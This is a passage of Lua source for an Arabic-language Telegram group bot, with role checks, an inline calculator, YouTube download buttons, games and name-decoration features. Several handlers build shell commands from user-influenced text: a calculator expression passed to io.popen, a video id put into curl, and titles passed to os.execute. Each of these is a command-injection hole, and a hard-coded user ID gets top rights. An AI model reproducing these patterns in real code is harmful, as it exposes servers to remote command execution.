elseif Redis:sismember(darket.."Creator:Group"..data.chat_id,Message_Edit.sender.user_id) == true then
data.The_Controller = 5
elseif Redis:sismember(darket.."Manger:Group"..data.chat_id,Message_Edit.sender.user_id) == true then
data.The_Controller = 6
elseif Redis:sismember(darket.."Admin:Group"..data.chat_id,Message_Edit.sender.user_id) == true then
data.The_Controller = 7
elseif Redis:sismember(darket.."Special:Group"..data.chat_id,Message_Edit.sender.user_id) == true then
data.The_Controller = 8
elseif tonumber(Message_Edit.sender.user_id) == tonumber(darket) then
data.The_Controller = 9
else
data.The_Controller = 10
end  
if data.The_Controller == 1 then  
data.ControllerBot = true
end
if data.The_Controller == 1 or data.The_Controller == 2 then
data.Devss = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 then
data.Dev = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 9 then
data.Ownerss = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 9 then
data.SuperCreator = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 9 then
data.Creator = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 9 then
data.Manger = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 7 or data.The_Controller == 9 then
data.Admin = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 7 or data.The_Controller == 8 or data.The_Controller == 9 then
data.Special = true
end
Redis:incr(darket..'Num:Message:Edit'..data.chat_id..Message_Edit.sender.user_id)
if Message_Edit.content.luatele == "messageContact" or Message_Edit.content.luatele == "messageVideoNote" or Message_Edit.content.luatele == "messageDocument" or Message_Edit.content.luatele == "messageAudio" or Message_Edit.content.luatele == "messageVideo" or Message_Edit.content.luatele == "messageVoiceNote" or Message_Edit.content.luatele == "messageAnimation" or Message_Edit.content.luatele == "messagePhoto" then
if Redis:get(darket.."Lock:edit"..data.chat_id) then
LuaTele.deleteMessages(data.chat_id,{[1]= data.message_id})
end
end
elseif data and data.luatele and data.luatele == "updateNewCallbackQuery" then
-- data.chat_id
Dataa = data.payload.data
-- data.sender_user_id
Text = LuaTele.base64_decode(data.payload.data)
IdUser = data.sender_user_id
ChatId = data.chat_id
Msg_id = data.message_id
calc_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'ON', data = IdUser..'ON'},{text = 'DEL', data = IdUser..'DEL'},{text = 'AC', data = IdUser..'rest'},{text = 'OFF', data = IdUser..'OFF'},
},
{
{text = '^', data = IdUser..'calc&^'},{text = '√', data = IdUser..'calc&√'},{text = '(', data = IdUser..'calc&('},{text = ')', data = IdUser..'calc&)'},
},
{
{text = '7', data = IdUser..'calc&7'},{text = '8', data = IdUser..'calc&8'},{text = '9', data = IdUser..'calc&9'},{text = '÷', data = IdUser..'calc&/'},
},
{
{text = '4', data = IdUser..'calc&4'},{text = '5', data = IdUser..'calc&5'},{text = '6', data = IdUser..'calc&6'},{text = 'x', data = IdUser..'calc&*'},
},
{
{text = '1', data = IdUser..'calc&1'},{text = '2', data = IdUser..'calc&2'},{text = '3', data = IdUser..'calc&3'},{text = '-', data = IdUser..'calc&-'},
},
{
{text = '0', data = IdUser..'calc&0'},{text = '.', data = IdUser..'calc&.'},{text = '+', data = IdUser..'calc&+'},{text = '=', data = IdUser..'equal'},
},
{
{text = 'مطور السورس', url = 'https://t.me/R2RR7'},
},
}
}
if Text and Text:match('(%d+)calc&(.*)') then
local result = {Text:match('(%d+)calc&(.*)')}
local num = result[2]
local sendrr = result[1]
if tonumber(IdUser) == tonumber(sendrr) then
local get = Redis:get(darket..IdUser..ChatId.."num")
if get then
tf = get 
else
tf = "" 
end
local txx = tf..num
Redis:set(darket..IdUser..ChatId.."num",txx)
edit(ChatId,Msg_id,"• اجراء عمليه حسابيه \n• "..txx, 'html', false, false, calc_markup)
else
LuaTele.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
end
end
if Text and Text:match('(%d+)equal') then
local sendrr = Text:match('(%d+)equal')
if tonumber(IdUser) == tonumber(sendrr) then
local math = Redis:get(darket..IdUser..ChatId.."num")
if math then
xxx = io.popen("gcalccmd '"..math.."'"):read('*a')
res = "• ناتج "..math.." هو \n• "..xxx
else
res = "• لا يوجد ما يمكن حسابه"
end
edit(ChatId,Msg_id,res , 'html', false, false, calc_markup)
Redis:del(darket..IdUser..ChatId.."num")
else
LuaTele.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
end
end
if Text and Text:match('(%d+)DEL') then
local sendrr = Text:match('(%d+)DEL')
if tonumber(IdUser) == tonumber(sendrr) then
local get = Redis:get(darket..IdUser..ChatId.."num")
if get then
gxx = ""
for a = 1, string.len(get)-1 do  
gxx = gxx..(string.sub(get, a,a)) 
end
Redis:set(darket..IdUser..ChatId.."num",gxx)
edit(ChatId,Msg_id,"• اجراء عمليه حسابيه \n• "..gxx, 'html', false, false, calc_markup)
else
LuaTele.answerCallbackQuery(data.id, "• لا يوجد مايمكن حذفه", true)
end
else
LuaTele.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
end
end
if Text and Text:match('(%d+)ON') then
local sendrr = Text:match('(%d+)ON') 
if tonumber(IdUser) == tonumber(sendrr) then
Redis:del(darket..IdUser..ChatId.."num")
edit(ChatId,Msg_id,"• تم تشغيل الحاسبه بنجاح ✅\n• restarted ✅" , 'html', false, false, calc_markup)
else
LuaTele.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
end
end
if Text and Text:match('(%d+)OFF') then
local sendrr = Text:match('(%d+)OFF')
if tonumber(IdUser) == tonumber(sendrr) then
Redis:del(darket..IdUser..ChatId.."num")
local reply_markupp = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'ON', data = IdUser..'ON'},
},
}
}
edit(ChatId,Msg_id,"• تم تعطيل الحاسبه بنجاح \n• اضغط ON لتشغيلها " , 'html', false, false, reply_markupp)
else
LuaTele.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
end
end
if Text and Text:match('(%d+)rest') then
local sendrr = Text:match('(%d+)rest')
if tonumber(IdUser) == tonumber(sendrr) then
Redis:del(darket..IdUser..ChatId.."num")
edit(ChatId,Msg_id,"• اهلا بك في بوت الحاسبه\n• welcome to calculator" , 'html', false, false, calc_markup)
else
LuaTele.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
end
end
if tonumber(IdUser) == 5386549632 then
data.The_Controller = 1
elseif tonumber(IdUser) == 5386549632 then
data.The_Controller = 1
elseif The_ControllerAll(IdUser) == true then  
data.The_Controller = 1
elseif Redis:sismember(darket.."Devss:Groups",IdUser) == true then
data.The_Controller = 2
elseif Redis:sismember(darket.."Dev:Groups",IdUser) == true then
data.The_Controller = 3
elseif Redis:sismember(darket.."Ownerss:Group"..ChatId,IdUser) == true then
data.The_Controller = 44
elseif Redis:sismember(darket.."SuperCreator:Group"..ChatId,IdUser) == true then
data.The_Controller = 4
elseif Redis:sismember(darket.."Creator:Group"..ChatId,IdUser) == true then
data.The_Controller = 5
elseif Redis:sismember(darket.."Manger:Group"..ChatId,IdUser) == true then
data.The_Controller = 6
elseif Redis:sismember(darket.."Admin:Group"..ChatId,IdUser) == true then
data.The_Controller = 7
elseif Redis:sismember(darket.."Special:Group"..ChatId,IdUser) == true then
data.The_Controller = 8
elseif tonumber(IdUser) == tonumber(darket) then
data.The_Controller = 9
else
data.The_Controller = 10
end  
if data.The_Controller == 1 then  
data.ControllerBot = true
end
if data.The_Controller == 1 or data.The_Controller == 2 then
data.Devss = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 then
data.Dev = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 9 then
data.Ownerss = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 9 then
data.SuperCreator = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 9 then
data.Creator = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 9 then
data.Manger = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 7 or data.The_Controller == 9 then
data.Admin = true
end
if data.The_Controller == 1 or data.The_Controller == 2 or data.The_Controller == 3 or data.The_Controller == 44 or data.The_Controller == 4 or data.The_Controller == 5 or data.The_Controller == 6 or data.The_Controller == 7 or data.The_Controller == 8 or data.The_Controller == 9 then
data.Special = true
end

if Text and Text:match('(%d+)dl/(.*)') then
local xd = {Text:match('(%d+)dl/(.*)')}
local UserId = xd[1]
local id = xd[2]
if tonumber(IdUser) == tonumber(UserId) then
local url = io.popen('curl -s "https://api-jack.ml/api37.php?id='..id..'"'):read('*a')
local json = JSON.decode(url)
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = 'تحميل صوت', data = IdUser..'sound/'..id}, {text = 'تحميل فيديو', data = IdUser..'video/'..id}, 
},
}
}
local txx = "["..json.title.."](https://youtu.be/"..id..""
LuaTele.editMessageText(ChatId,Msg_id,txx, 'md', true, false, reply_markup)
else
LuaTele.answerCallbackQuery(data.id, "※ هذا الامر لا يخصك ", true)
end
end
if Text and Text:match('(%d+)sound/(.*)') then
local xd = {Text:match('(%d+)sound/(.*)')}
local UserId = xd[1]
local id = xd[2]
if tonumber(IdUser) == tonumber(UserId) then
local u = LuaTele.getUser(IdUser)
LuaTele.answerCallbackQuery(data.id, "※ انتظر يتم التحميل ", true)
local url = io.popen('curl -s "https://api-jack.ml/api37.php?id='..id..'"'):read('*a')
local json = JSON.decode(url)
local link = "https://www.youtube.com/watch?v="..id
local title = json.title
local title = title:gsub("/","-") 
local title = title:gsub("\n","-") 
local title = title:gsub("|","-") 
local title = title:gsub("'","-") 
local title = title:gsub('"',"-") 
local time = json.t
local p = json.a
local p = p:gsub("/","-") 
local p = p:gsub("\n","-") 
local p = p:gsub("|","-") 
local p = p:gsub("'","-") 
local p = p:gsub('"',"-") 
LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
os.execute("yt-dlp "..link.." -f 251 -o '"..title..".mp3'")
LuaTele.sendAudio(ChatId,0,'./'..title..'.mp3',"※ ["..title.."]("..link..")\n※ حسب طلب ["..u.first_name.."](tg://user?id="..IdUser..")","md",tostring(time),title,p) 
sleep(2)
os.remove(""..title..".mp3")
else
LuaTele.answerCallbackQuery(data.id, "※ هذا الامر لا يخصك ", true)
end
end
if Text and Text:match('(%d+)video/(.*)') then
local xd = {Text:match('(%d+)video/(.*)')}
local UserId = xd[1]
local id = xd[2]
if tonumber(IdUser) == tonumber(UserId) then
local u = LuaTele.getUser(IdUser)
LuaTele.answerCallbackQuery(data.id, "※ انتظر يتم التحميل ", true)
local url = io.popen('curl -s "https://api-jack.ml/api37.php?id='..id..'"'):read('*a')
local json = JSON.decode(url)
local link = "https://www.youtube.com/watch?v="..id
local title = json.title
local title = title:gsub("/","-") 
local title = title:gsub("\n","-") 
local title = title:gsub("|","-") 
local title = title:gsub("'","-") 
local title = title:gsub('"',"-") 
LuaTele.deleteMessages(ChatId,{[1]= Msg_id})
os.execute("yt-dlp "..link.." -f 18 -o '"..title..".mp4'")
LuaTele.sendVideo(ChatId,0,'./'..title..'.mp4',"※ ["..title.."]("..link..")\n※ حسب طلب ["..u.first_name.."](tg://user?id="..IdUser..")","md") 
sleep(4)
os.remove(""..title..".mp4")
else
LuaTele.answerCallbackQuery(data.id, "※ هذا الامر لا يخصك ", true)
end
end
if Text and Text:match('(%d+)/UnKed') then
    local UserId = Text:match('(%d+)/UnKed')
    if tonumber(UserId) ~= tonumber(IdUser) then
    return LuaTele.answerCallbackQuery(data.id, "٠ الامر لا يخصك", true)
    end
    LuaTele.setChatMemberStatus(ChatId,UserId,'restricted',{1,1,1,1,1,1,1,1})
    return edit(ChatId,Msg_id,"٠ تم التحقق منك اجابتك صحيحه يمكنك الدردشه الان", 'md', false)
    end

if Text and Text:match('/Mahibes(%d+)') then
local GetMahibes = Text:match('/Mahibes(%d+)') 
local NumMahibes = math.random(1,6)
if tonumber(GetMahibes) == tonumber(NumMahibes) then
Redis:incrby(darket.."Num:Add:Games"..ChatId..IdUser, 1)  
MahibesText = '*٠الف مبروك حظك حلو اليوم\n٠ فزت ويانه وطلعت المحيبس بل عظمه رقم {'..NumMahibes..'}*'
else
MahibesText = '*٠للاسف لقد خسرت المحيبس بالعظمه رقم {'..NumMahibes..'}\n٠ جرب حضك ويانه مره اخره*'
end
if NumMahibes == 1 then
Mahibes1 = '🤚' else Mahibes1 = '👊'
end
if NumMahibes == 2 then
Mahibes2 = '🤚' else Mahibes2 = '👊'
end
if NumMahibes == 3 then
Mahibes3 = '🤚' else Mahibes3 = '👊' 
end
if NumMahibes == 4 then
Mahibes4 = '🤚' else Mahibes4 = '👊'
end
if NumMahibes == 5 then
Mahibes5 = '🤚' else Mahibes5 = '👊'
end
if NumMahibes == 6 then
Mahibes6 = '🤚' else Mahibes6 = '👊'
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '𝟏 ٠ { '..Mahibes1..' }', data = '/*'}, {text = '𝟐 ٠ { '..Mahibes2..' }', data = '/*'}, 
},
{
{text = '𝟑 ٠ { '..Mahibes3..' }', data = '/*'}, {text = '𝟒 ٠ { '..Mahibes4..' }', data = '/*'}, 
},
{
{text = '𝟓 ٠ { '..Mahibes5..' }', data = '/*'}, {text = '𝟔 ٠ { '..Mahibes6..' }', data = '/*'}, 
},
{
{text = '{ اللعب مره اخرى }', data = '/MahibesAgane'},
},
}
}
return edit(ChatId,Msg_id,MahibesText, 'md', true, false, reply_markup)
end
if Text == "/MahibesAgane" then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '𝟏 ٠ { 👊 }', data = '/Mahibes1'}, {text = '𝟐 ٠ { 👊 }', data = '/Mahibes2'}, 
},
{
{text = '𝟑 ٠ { 👊 }', data = '/Mahibes3'}, {text = '𝟒 ٠ { 👊 }', data = '/Mahibes4'}, 
},
{
{text = '𝟓 ٠ { 👊 }', data = '/Mahibes5'}, {text = '𝟔 ٠ { 👊 }', data = '/Mahibes6'}, 
},
}
}
local TextMahibesAgane = [[*
٠ لعبة المحيبس هي لعبة الحظ 
٠ جرب حظك ويه البوت واتونس 
٠ كل ما عليك هوا الضغط على احدى العضمات في الازرار
*]]
return edit(ChatId,Msg_id,TextMahibesAgane, 'md', true, false, reply_markup)
end
if Text and Text:match('(.*)/yes_z/(.*)') then
  local anubis = {Text:match('(.*)/yes_z/(.*)')}
  local zwga_id = anubis[1]
  local zwg_id = anubis[2]
  if tonumber(zwga_id) == tonumber(IdUser) then
    local zwga_name = LuaTele.getUser(zwga_id).first_name
    local zwg_name = LuaTele.getUser(zwg_id).first_name
    Redis:set(darket..ChatId..zwga_id.."mtzwga:", zwg_id)
    Redis:set(darket..ChatId..zwg_id.."mtzwga:", zwga_id)
    return edit(ChatId, Msg_id, "باركو لاختكم ["..zwga_name.."](tg://user?id="..zwga_id..")\nوافقت تتزوج المحروص ["..zwg_name.."](tg://user?id="..zwg_id..")","md",false)
  end
end
if Text and Text:match('(.*)/no_z/(.*)') then
  local anubis = {Text:match('(.*)/no_z/(.*)')}
  local zwga_id = anubis[1]
  local zwg_id = anubis[2]
  if tonumber(zwga_id) == tonumber(IdUser) then
    return edit(ChatId, Msg_id, "امال هتتزوجي امتي يا موكوسه ؟؟","md",false)
  end
end
if Text and Text:match('(%d+)/zeng') then
  local UserId = Text:match('(%d+)/zeng')
  if tonumber(UserId) == tonumber(IdUser) then
    Redis:set(darket..ChatId..IdUser.."zkrf:", "zeng")
    edit(ChatId, Msg_id, "▾ 𝙎𝙀𝙉𝘿 𝙐𝙍 𝙉𝘼𝙈𝙀 🎀..! \n \n✴ اࢪسل الاسم لتتم زخࢪفتھـۃ الان 🎀..!", "md",false)
  end
  end
if Text and Text:match('(.*)/a(.*)') then
    local anubis = {Text:match('(.*)/a(.*)')}
    local UserId = anubis[1]
    local z_num = anubis[2]
    local z_text = Redis:get(darket..ChatId..IdUser.."zkrf:text")
    Redis:set(darket..ChatId..IdUser.."zkrf:num", z_num)
    if tonumber(UserId) == tonumber(IdUser) then
      local api = https.request("https://api-jack.ml/api19.php?text="..URL.escape(z_text))
      local zkrf = JSON.decode(api)
      local zk = zkrf['anubis'][z_num]
      local reply_markup = LuaTele.replyMarkup{
        type = 'inline',
        data = {
        {{text = zk , data = IdUser.."/b1"}},
        {{text = "𓂄𓆩 "..zk.." 𓆪𓂁", data = IdUser.."/b2"}},
        {{text = "𓆩⸤"..zk.."⸥𓆪", data = IdUser.."/b3"}},
        {{text = "𓆩"..zk.."𓆪", data = IdUser.."/b4"}},
        {{text = "⌁ "..zk.." ’♥ " , data = IdUser.."/b5"}},
        {{text = "ꔷ"..zk.." 🧸💕 ˝♥›." , data = IdUser.."/b6"}},
        {{text = "➹"..zk.." 𓂄𓆩♥𓆪‌‌𓂁", data = IdUser.."/b7"}},
        {{text = "★⃝➼"..zk.." ꗛ", data = IdUser.."/b8"}},
        {{text =  "⋆⃟➼"..zk.." ꕸ", data = IdUser.."/b9"}},
        {{text = "⸢"..zk.."⸥", data = IdUser.."/b10"}},
        {{text = "ꞏ"..zk.." ｢♥｣", data = IdUser.."/b11"}},
        {{text = "⋆"..zk.." ’🧸💕›", data = IdUser.."/b12"}},
        {{text = " ᯓ 𓆩 ˹ "..zk.." ˼ 𓆪 𓆃", data = IdUser.."/b13"}},
        {{text = "𓆩 "..zk.."ｌ➝ ˛⁽♥₎ 𓆪", data = IdUser.."/b14"}},
        {{text = "𒅒• !! "..zk.."  ᵛ͢ᵎᵖ 𒅒", data = IdUser.."/b15"}},
        {{text = "˚₊· ͟͟͞͞➳❥❬ "..zk.." ❭•°", data = IdUser.."/b16"}},
        {{text = "زخࢪفـــھـۃ بالايمۅجي 🎀..!", data = IdUser.."/emo"}},
        }
        }
      edit(ChatId, Msg_id, "▾\n★ لقد اختࢪت \n▷ "..zk, "md",true,false,reply_markup)
    end
    end
if Text and Text:match('(.*)/b(.*)') then
      local anubis = {Text:match('(.*)/b(.*)')}
      local UserId = anubis[1]
      local z_num = tonumber(anubis[2])
      local z_text = Redis:get(darket..ChatId..IdUser.."zkrf:text")
      local z_save = Redis:get(darket..ChatId..IdUser.."zkrf:num")
      if tonumber(UserId) == tonumber(IdUser) then
        local api = https.request("https://api-jack.ml/api19.php?text="..URL.escape(z_text))
        local zkrf = JSON.decode(api)
        local zk = zkrf['anubis'][z_save]
        local zk_list = {
          zk,
          "𓂄𓆩"..zk.."𓆪𓂁",
          "𓆩⸤"..zk.."⸥𓆪",
          "𓆩"..zk.."𓆪",
          "⌁ "..zk.." ’♥ ", 
          "ꔷ"..zk.." 🧸💕 ˝♥›.", 
          "➹"..zk.." 𓂄𓆩♥𓆪‌‌𓂁", 
          "★⃝➼"..zk.." ꗛ", 
          "⋆⃟➼"..zk.." ꕸ",
          "⸢"..zk.."⸥",
          "ꞏ"..zk.." ｢♥｣",
          "⋆"..zk.." ’🧸💕›",
          " ᯓ 𓆩 ˹ "..zk.." ˼ 𓆪 𓆃",
          "𓆩 "..zk.."ｌ➝ ˛⁽♥₎ 𓆪",
          "𒅒• !! "..zk.."  ᵛ͢ᵎᵖ 𒅒",
          "˚₊· ͟͟͞͞➳❥❬ "..zk.." ❭•°",
        }
        edit(ChatId, Msg_id, "▾\n★ لقد اختࢪت \n▷ `"..zk_list[z_num].."`", "md",false)
        Redis:del(darket..ChatId..IdUser.."zkrf:text")
        Redis:del(darket..ChatId..IdUser.."zkrf:num")
      end
      end
-- z  emo
if Text and Text:match('(%d+)/emo') then
  local UserId = Text:match('(%d+)/emo')
  local z_text = Redis:get(darket..ChatId..IdUser.."zkrf:text")
  local z_save = Redis:get(darket..ChatId..IdUser.."zkrf:num")
  if tonumber(UserId) == tonumber(IdUser) then
    local api = https.request("https://api-jack.ml/api19.php?text="..URL.escape(z_text))
    local zkrf = JSON.decode(api)
    local zk = zkrf['anubis'][z_save]
    edit(ChatId, Msg_id, "★ تمت الزخࢪفھـۃ بنجاح\n\n▷ `"..zk.." ¦✨❤️` \n\n▷ `"..zk.." “̯ 🐼💗`\n\n▷ `"..zk.." 🦋“`\n\n▷ `"..zk.."ّ ❥̚͢₎ 🐣`\n\n▷ `"..zk.." ℡ ̇ ✨🐯⇣✦`\n\n▷ `"..zk.." 😴🌸✿⇣`\n\n▷ `"..zk.." •🙊💙`\n\n▷ `"..zk.." ❥┊⁽ ℡🦁🌸`\n\n▷ `"..zk.." •💚“`\n\n▷ `"..zk.." ⚡️♛ֆ₎`\n\n▷ `"..zk.." ⁞♩⁽💎🌩₎⇣✿`\n\n▷ `"..zk.." 〄💖‘`\n\nاضغط علي الزخࢪفھـۃ للنسخ 🎀..!", "md",false)
    Redis:del(darket..ChatId..IdUser.."zkrf:text")
    Redis:del(darket..ChatId..IdUser.."zkrf:num")
  end
  end
-- zar call back
if Text and Text:match('(%d+)/zar') then
    local UserId = Text:match('(%d+)/zar')
    if tonumber(UserId) == tonumber(IdUser) then
      Redis:set(darket..ChatId..IdUser.."zkrf:", "zar")
      edit(ChatId, Msg_id, "▾ 𝙎𝙀𝙉𝘿 𝙐𝙍 𝙉𝘼𝙈𝙀 🎀..! \n \n✴ اࢪسل الاسم لتتم زخࢪفتھـۃ الان 🎀..!", "md",false)
    end
    end
if Text and Text:match('(.*)/yes_zw/(.*)') then
  local anubis = {Text:match('(.*)/yes_zw/(.*)')}
  local zwga_id = anubis[1]
  local zwg_id = anubis[2]
  if tonumber(zwga_id) == tonumber(IdUser) then
    local zwga_name = LuaTele.getUser(zwga_id).first_name
    local zwg_name = LuaTele.getUser(zwg_id).first_name
    Redis:set(darket..ChatId..zwga_id.."mtzwga:", zwg_id)
    Redis:set(darket..ChatId..zwg_id.."mtzwga:", zwga_id)
    return edit(ChatId, Msg_id, "باركو ل ["..zwga_name.."](tg://user?id="..zwga_id..")\nوافق يتزوج ["..zwg_name.."](tg://user?id="..zwg_id..")","md",false)
  end
end
if Text and Text:match('(.*)/no_zw/(.*)') then
  local anubis = {Text:match('(.*)/no_zw/(.*)')}
  local zwga_id = anubis[1]
  local zwg_id = anubis[2]
  if tonumber(zwga_id) == tonumber(IdUser) then
    return edit(ChatId, Msg_id, "امال عاوزني اجبلك مين تتزوجو ؟؟","md",false)
  end
end
if Text and Text:match('(%d+)/cancelrdd') then
local UserId = Text:match('(%d+)/cancelrdd')
if tonumber(IdUser) == tonumber(UserId) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
Redis:del(darket.."Set:array:Ssd"..IdUser..":"..ChatId)
Redis:del(darket.."Set:array:rd"..IdUser..":"..ChatId)
Redis:del(darket.."Set:array"..IdUser..":"..ChatId)
Redis:del(darket.."Set:Manager:rd"..IdUser..":"..ChatId)
Redis:del(darket.."Set:Manager:rd"..IdUser..":"..ChatId)
Redis:del(darket.."Set:Rd"..IdUser..":"..ChatId)
Redis:del(darket.."Set:On"..IdUser..":"..ChatId)
Redis:del(darket.."Set:Manager:rd:inline"..IdUser..":"..ChatId)
Redis:del(darket.."Set:On:mz"..IdUser..":"..ChatId)
Redis:del(darket.."Set:Rd:mz"..IdUser..":"..ChatId)
edit(ChatId,Msg_id,"تم الغاء الامر بنجاح", 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/cancelkit') then
    local UserId = Text:match('(%d+)/cancelkit')
    if tonumber(IdUser) == tonumber(UserId) then
    local reply_markup = LuaTele.replyMarkup{
    type = 'inline',
    data = {
    {
    {text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
    },
    }
    }
    Redis:del(darket.."Set:kit"..IdUser..":"..ChatId)
    edit(ChatId,Msg_id,"تم الغاء الامر بنجاح", 'md', true, false, reply_markup)
    end
    end
    if Text and Text:match('(%d+)/rmkit_all') then
        local UserId = Text:match('(%d+)/rmkit_all')
        if tonumber(IdUser) == tonumber(UserId) then
        local reply_markup = LuaTele.replyMarkup{
        type = 'inline',
        data = {
        {
        {text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
        },
        }
        }
        Redis:set(darket.."kit_defullt:","true")
        Redis:del(darket.."kit:")
        edit(ChatId,Msg_id,"تم مسح جميع الاسأله بنجاح", 'md', true, false, reply_markup)
        end
        end
if Text and Text:match('(%d+)/songg') then
local UserId = Text:match('(%d+)/songg')
if tonumber(IdUser) == tonumber(UserId) then
Num = math.random(8,83)
Mhm = math.random(108,143)
Mhhm = math.random(166,179)
Mmhm = math.random(198,216)
Mhmm = math.random(257,626)
local Texting = {Num,Mhm,Mhhm,Mmhm,Mhmm}
local Rrr = Texting[math.random(#Texting)]
au ={
type = "audio",
media = "https://t.me/mmsst13/"..Rrr.."",
caption = '٭ اليك اغنيه عشوائيه من البوت\n',
parse_mode = "Markdown"                                                                                                                                                               
}     
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'اغنيه اخري', callback_data=IdUser.."/songg"},
},
}
local mm = Msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..ChatId.."&message_id="..mm.."&media="..JSON.encode(au).."&reply_markup="..JSON.encode(keyboard))
end 
end
if Text and Text:match('(%d+)/sorty(%d+)') then
local UserId = {Text:match('(%d+)/sorty(%d+)')}
local current = math.floor(tonumber(UserId[2]))
local next = math.floor(tonumber(UserId[2]) + 1)
local prev = math.floor(tonumber(UserId[2]) - 1)
print(current)
if tonumber(IdUser) == tonumber(UserId[1]) then
local photo = LuaTele.getUserProfilePhotos(IdUser)
local ph = photo.photos[tonumber(current)]
if ph then
local pho = ph.sizes[#photo.photos[1].sizes].photo.remote.id
pph ={
type = "photo",
media = pho,
caption = '٭ عدد صورك هو '..photo.total_count..'\n٭ وهذه صورتك رقم '..current..'\n',
parse_mode = "Markdown"                                                                                                                                                               
}     
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'صورتك التاليه', callback_data=IdUser.."/sorty"..next..""},{text = 'صورتك السابقه', callback_data=IdUser.."/sorty"..prev..""},
},
}
local mm = Msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..ChatId.."&message_id="..mm.."&media="..JSON.encode(pph).."&reply_markup="..JSON.encode(keyboard))
else
LuaTele.answerCallbackQuery(data.id, "٠ لم يتم العثور علي رقم الصوره المطلوبه ", true)
end
end 
end
 
if Text == 'EndAddarray'..IdUser then  
if Redis:get(darket..'Set:array'..IdUser..':'..ChatId) == 'true1' then
Redis:del(darket..'Set:array'..IdUser..':'..ChatId)
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sᴏᴜʀᴄʀ darket',url='https://t.me/R125R'}},
}
local msg_idd = Msg_id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatId..'&text='..URL.escape(" *٠تم حفظ الردود بنجاح*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
else
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sᴏᴜʀᴄʀ darket',url='https://t.me/R125R'}},
}
return https.request("https://api.telegram.org/bot"..Token..'/editMessageText?chat_id='..ChatId..'&text='..URL.escape(" *٠تم تنفيذ الامر سابقا*")..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
end
if Text and Text:match('(%d+)/mp3(.*)') then
local UserId = {Text:match('(%d+)/mp3(.*)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '٠ TeAm DarKet ٠️', url = 't.me/'..chsource..''}, 
},
}
}
local TextHelp = [[*
٠ 𝑆𝐸𝑁𝐷 𝑇𝐻𝐸 𝑁𝐴𝑀𝐸 𝑂𝐹 𝑊𝐻𝐴𝑇 𝑌𝑂𝑈 𝑊𝐴𝑁𝑇 𝑇𝑂 𝐷𝑂𝑊𝑁𝐿𝑂𝐴𝐷 𝐴𝑁𝐷 𝑇𝐻𝐸 𝐵𝑂𝑇 𝑊𝐼𝐿𝐿 𝑆𝐸𝑁𝐷 𝐼𝑇 𝑇𝑂 𝑌𝑂𝑈 𝐻𝐸𝑅𝐸 .
*]]
Redis:set(darket.."youtube"..IdUser..ChatId,'mp3')
edit(ChatId,Msg_id,TextHelp, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/mp4(.*)') then
local UserId = {Text:match('(%d+)/mp4(.*)')}
if tonumber(IdUser) == tonumber(UserId[1]) then
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
